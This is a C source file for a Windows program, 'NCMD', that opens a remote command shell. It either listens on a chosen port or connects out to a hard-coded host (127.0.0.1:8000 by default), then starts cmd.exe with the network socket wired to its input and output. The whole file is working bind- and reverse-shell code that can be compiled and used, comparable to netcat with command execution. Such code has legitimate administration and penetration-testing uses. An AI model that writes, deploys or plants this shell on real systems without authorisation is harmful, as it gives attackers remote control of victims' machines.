#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

#define SERVER "127.0.0.1"
#define PORT 8000

char* USAGE =
    "Starts a new instance of the windows command interpreter over a socket connection.\n"
    "\n"
    "NCMD [\\L] [host] [port]\n"
    "\n"
    "[\\L]  Listen for a connection from a remote host.\n"
    "\n"
    "Any other flags will be passed to the underlying cmd process.\n"
    "See CMD /? for more options.";

static SOCKET CreateSocket() {
    WSADATA wsaData;
    SOCKET sock;
    LPWSAPROTOCOL_INFO protocolInfo = NULL;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("Failed to initialize Winsock.\n");
        return INVALID_SOCKET;
    }

    sock = WSASocket(AF_INET, SOCK_STREAM, 0, protocolInfo, 0, 0);
    if (sock == INVALID_SOCKET) {
        printf("Failed to create socket\n");
        WSACleanup();
        return INVALID_SOCKET;
    }

    return sock;
}

SOCKET ListenForClient(char* host, int port) {
    SOCKET serverSocket, clientSocket;
    struct sockaddr_in serverAddr, clientAddr, sin;
    socklen_t sinLen = sizeof(sin);
    int clientAddrLen = sizeof(clientAddr);

    serverSocket = CreateSocket();
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(host);
    serverAddr.sin_port = htons(port);

    if (bind(serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        printf("Failed to bind socket\n");
        closesocket(serverSocket);
        WSACleanup();
        return INVALID_SOCKET;
    }

    if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR) {
        printf("Failed to listen on socket\n");
        closesocket(serverSocket);
        WSACleanup();
        return INVALID_SOCKET;
    }

    if (getsockname(serverSocket, (struct sockaddr *)&sin, &sinLen) == -1)
        perror("getsockname");
    else
        printf("Listening on %s port %d ...\n", host, ntohs(sin.sin_port));

    clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &clientAddrLen);
    if (clientSocket == INVALID_SOCKET) {
        printf("Failed to accept connection\n");
        closesocket(serverSocket);
        WSACleanup();
        return INVALID_SOCKET;
    }

    closesocket(serverSocket);
    return clientSocket;
}

SOCKET ConnectToServer() {
    SOCKET clientSocket;
    struct sockaddr_in serverAddr;

    clientSocket = CreateSocket();
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(SERVER);
    serverAddr.sin_port = htons(PORT);

    if (connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        printf("Failed to connect to the server.\n");
        closesocket(clientSocket);
        WSACleanup();
        return INVALID_SOCKET;
    }

    return clientSocket;
}

int main(int argc, char* argv[]) {
    STARTUPINFOA startupInfo;
    PROCESS_INFORMATION processInfo;
    SOCKET sock;
    int listen = 0;
    char* host = NULL;
    int port = -1;

    // parse command-line arguments ...
    for (int i = 1; i < argc; i++) {
        if (argv[i][0] == '/') {
            // flag option
            switch (argv[i][1]) {
                case '?':
                    printf("%s\n", USAGE);
                    return 0;
                case 'L':
                case 'l':
                    listen = 1;
                    break;
            }
        } else {
            // positional argument
            if (host == NULL) {
                host = argv[i];
                if (strcmp(host, "localhost") == 0)
                    host = "127.0.0.1";
                continue;
            }

            if (port == -1) {
                port = atoi(argv[i]);
                continue;
            }
        }
    }

    if (listen) {
        // ncmd.exe /L ...

        // if no host or port, exit
        if (host == NULL) {
            // ncmd.exe /L
            printf("%s\n", USAGE);
            return 1;
        }

        // if no port given, use host as port.
        if (port == -1) {
            // ncmd.exe /L 8000
            port = atoi(host);
            host = "0.0.0.0";
        }

        sock = ListenForClient(host, port);
    } else {
        sock = ConnectToServer();
    }

    if (sock == INVALID_SOCKET)
        return 1;

    ZeroMemory(&startupInfo, sizeof(startupInfo));
    startupInfo.cb = sizeof(startupInfo);
    startupInfo.dwFlags = STARTF_USESTDHANDLES;
    startupInfo.hStdInput = (HANDLE)sock;
    startupInfo.hStdOutput = (HANDLE)sock;
    startupInfo.hStdError = (HANDLE)sock;

    if (!CreateProcessA(NULL, "cmd.exe /q", NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInfo)) {
        printf("Failed to create cmd.exe process.\n");
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    WaitForSingleObject(processInfo.hProcess, INFINITE);

    CloseHandle(processInfo.hProcess);
    CloseHandle(processInfo.hThread);
    closesocket(sock);
    WSACleanup();

    return 0;
}
